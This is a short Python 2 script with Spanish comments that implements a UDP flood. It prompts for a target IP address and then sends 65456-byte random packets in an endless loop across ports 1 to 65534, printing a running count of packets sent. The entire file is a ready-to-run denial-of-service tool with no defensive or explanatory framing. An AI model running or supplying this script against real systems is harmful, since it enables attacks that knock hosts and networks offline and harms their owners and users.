#Importar funciones del sistema Linux
# Parametros y funciones de sistema
import sys
# Comandos e interaccion de sistema
import os
#Funciones de tiempo
import time
# Permite abrir conexiones
import socket
# Permite generar numeros aleatorios
import random

#Comienzo del codigo
# Abro sockets de conexion, IPv4 y UDP
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# Generar 65456 caracteres aleatorios por envio de paquete
bytes = random._urandom(65456)

#Limpio la terminal
os.system("clear")

#Pregunta por IP
ip = raw_input("Objetivo IP: ")

#Limpio la terminal
os.system("clear")

#Comienza lo ricolino
sent = 0
port = 1
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "%s paquetes enviados a %s y puerto:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

